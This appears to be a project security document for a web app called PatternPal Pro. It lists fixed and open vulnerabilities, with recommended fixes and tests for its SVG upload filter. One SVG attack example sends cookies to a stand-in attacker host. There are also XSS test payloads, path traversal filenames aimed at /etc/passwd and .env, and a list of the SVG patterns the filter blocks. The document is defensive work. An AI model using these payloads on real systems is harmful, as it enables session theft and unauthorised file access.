# Security Fixes

This document tracks security vulnerabilities that have been identified and fixed in PatternPal Pro.

## Fixed Vulnerabilities

### 1. ✅ CRITICAL: Missing Webhook Handlers (Fixed 2024)

**Risk**: Users could subscribe once, immediately cancel, and retain Pro access indefinitely without payment.

**Impact**: Direct revenue loss - users getting paid features without paying.

**Fix**: Added proper webhook handlers for subscription lifecycle events:
- `customer.subscription.updated` - Revokes Pro access when subscription becomes inactive (canceled, incomplete, past_due, unpaid)
- `customer.subscription.deleted` - Revokes Pro access when subscription is deleted
- `invoice.payment_failed` - Revokes Pro access immediately on payment failure

**Files Modified**:
- `app/api/stripe/webhook/route.ts`

**Configuration Required**: See `WEBHOOK_SETUP.md` for Stripe dashboard configuration steps.

---

### 2. ✅ HIGH: SVG XSS Vulnerability (Fixed 2024)

**Risk**: Malicious SVG files with embedded JavaScript could execute in user's browser, stealing session data or performing unauthorized actions.

**Impact**:
- Session hijacking
- Cookie theft
- Unauthorized actions on behalf of users
- Cross-site scripting (XSS) attacks

**Attack Vector Example**:
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
</svg>
```

**Fix**: Implemented comprehensive SVG validation that rejects files containing:
- `<script>` tags
- Event handlers (`onclick`, `onload`, etc.)
- `<object>`, `<embed>`, `<iframe>` tags
- `javascript:` protocols
- `data:text/html` URIs
- `<foreignObject>` elements (can contain HTML)
- Malicious data URIs in `<use>` and `<image>` elements

**Files Modified**:
- `src/lib/utils/imageUtils.ts` - Added `validateSvgSafety()` function
- `app/page.tsx` - Integrated SVG validation into paste and file upload handlers

**User Experience**: Users attempting to upload dangerous SVGs receive a clear error message directing them to use PNG or JPEG formats instead.

---

## Remaining Vulnerabilities

### 3. 🔴 HIGH: Weak Filename Sanitization (Not Fixed Yet)

**Risk**: Path traversal attacks via malicious filenames.

**Impact**: Potential to overwrite system files or access files outside intended directories.

**Attack Vector**:
```javascript
// User uploads file named: "../../../etc/passwd.png"
// Or: "../../../../.env"
```

**Current Code** (`src/lib/utils/zipUtils.ts`, line 15):
```typescript
const cleanName = originalName.replace(/[^a-zA-Z0-9._-]/g, '_');
```

**Issue**: Only sanitizes the basename, doesn't prevent directory traversal.

**Recommended Fix**:
```typescript
// Reject filenames with path separators entirely
if (originalName.includes('/') || originalName.includes('\\') || originalName.includes('..')) {
  throw new Error('Invalid filename: path separators not allowed');
}

// Then sanitize the basename
const cleanName = originalName
  .replace(/[^a-zA-Z0-9._-]/g, '_')  // Remove dangerous chars
  .slice(0, 200);  // Limit length to prevent filesystem issues
```

---

### 4. 🔴 HIGH: Origin Validation Bypass in Checkout (Not Fixed Yet)

**Risk**: Session hijacking via CSRF or redirect attacks during checkout.

**Impact**:
- Attacker could initiate checkout from their site
- Steal session after payment completes
- User gets charged but attacker receives Pro access

**Current Code** (`app/api/stripe/checkout/route.ts`, lines 20-22):
```typescript
const origin = req.headers.get('origin');
const successUrl = `${origin}/?upgrade=success&session_id={CHECKOUT_SESSION_ID}`;
const cancelUrl = `${origin}/?upgrade=cancelled`;
```

**Issue**: No validation that `origin` matches your actual domain. Attacker can send request from `evil.com` and redirect back to their site.

**Attack Scenario**:
1. Attacker creates page on `evil.com`
2. Page makes checkout request to your API with stolen session cookie
3. User completes payment thinking they're on PatternPal
4. Redirect goes to `evil.com/?session_id=...`
5. Attacker uses session ID to activate Pro on their account

**Recommended Fix**:
```typescript
const ALLOWED_ORIGINS = [
  'https://patternpal-pro.com',
  'https://www.patternpal-pro.com',
  'http://localhost:3000',  // Dev only
];

const origin = req.headers.get('origin');
if (!origin || !ALLOWED_ORIGINS.includes(origin)) {
  return NextResponse.json(
    { error: 'Invalid origin' },
    { status: 403 }
  );
}
```

---

### 5. 🟡 MEDIUM: Console Logging of Sensitive Data (Not Fixed Yet)

**Risk**: Sensitive data exposed in browser console logs.

**Impact**:
- Email addresses visible in console (privacy concern)
- Internal logic exposed to attackers
- GDPR compliance risk

**Examples**:
- `app/page.tsx`, lines 114, 118, 122: Logs DPI detection (safe)
- `app/page.tsx`, line 214: Logs DPI usage (safe)
- Stripe customer emails logged server-side (concern if logs are shared)

**Recommended Fix**: Remove or redact logs containing PII in production builds:
```typescript
if (process.env.NODE_ENV === 'development') {
  console.log('User email:', email);  // Only in dev
}
```

---

### 6. 🟡 MEDIUM: EXIF Data Not Stripped (Not Fixed Yet)

**Risk**: Uploaded images may contain sensitive EXIF metadata (GPS coordinates, camera model, timestamps, etc.)

**Impact**:
- Privacy leak if users export and share patterns
- GPS location exposed
- Personal information in maker notes

**Current Behavior**: Images are processed as-is, preserving all metadata.

**Recommended Fix**: Strip EXIF data before exporting patterns:
```typescript
// Use canvas to re-encode image without metadata
async function stripExifData(img: HTMLImageElement): Promise<Blob> {
  const canvas = document.createElement('canvas');
  canvas.width = img.width;
  canvas.height = img.height;
  const ctx = canvas.getContext('2d')!;
  ctx.drawImage(img, 0, 0);
  return new Promise((resolve) => {
    canvas.toBlob((blob) => resolve(blob!), 'image/png');
  });
}
```

---

### 7. 🟡 MEDIUM: LocalStorage for Usage Tracking (Not Fixed Yet)

**Risk**: LocalStorage can be read by any JavaScript on the same domain (e.g., via XSS).

**Impact**:
- Attackers could manipulate free trial counts
- Users could reset their trial by clearing storage
- Cross-subdomain attacks

**Current Code** (`app/page.tsx`, lines 59-71):
```typescript
const count = Number(localStorage.getItem(FREE_TESTS_KEY) || '0');
localStorage.setItem(FREE_TESTS_KEY, String(count + 1));
```

**Issue**: No server-side validation, easily bypassed.

**Recommended Fix**: Move trial tracking to server-side:
- Store trial count in Clerk user metadata
- Validate on backend before processing images
- Rate limit by IP address as additional protection

---

## Priority Order for Fixes

1. ✅ **Webhook handlers** - CRITICAL (Revenue protection) - **FIXED**
2. ✅ **SVG XSS** - HIGH (Security) - **FIXED**
3. 🔴 **Filename sanitization** - HIGH (Security) - Recommended next
4. 🔴 **Origin validation** - HIGH (Revenue + Security) - Recommended next
5. 🟡 **Console logging** - MEDIUM (Privacy)
6. 🟡 **EXIF stripping** - MEDIUM (Privacy)
7. 🟡 **LocalStorage** - MEDIUM (Business logic)

---

## Testing Recommendations

### Testing SVG XSS Fix

Try uploading these test SVGs (they should all be rejected):

**Test 1: Script tag**
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
```

**Test 2: Event handler**
```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <rect width="100" height="100"/>
</svg>
```

**Test 3: JavaScript protocol**
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <a href="javascript:alert('XSS')">
    <text x="10" y="20">Click me</text>
  </a>
</svg>
```

**Test 4: ForeignObject with HTML**
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('XSS')</script>
    </body>
  </foreignObject>
</svg>
```

**Expected Result**: All should show error: "SVG contains potentially dangerous content and cannot be uploaded. Please use PNG or JPEG formats instead."

**Safe SVG (should work)**:
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <circle cx="50" cy="50" r="40" fill="blue"/>
</svg>
```

### Testing Webhook Handlers

See `WEBHOOK_SETUP.md` for webhook testing instructions.

---

## Security Contact

If you discover additional security vulnerabilities, please report them immediately to [security contact email].
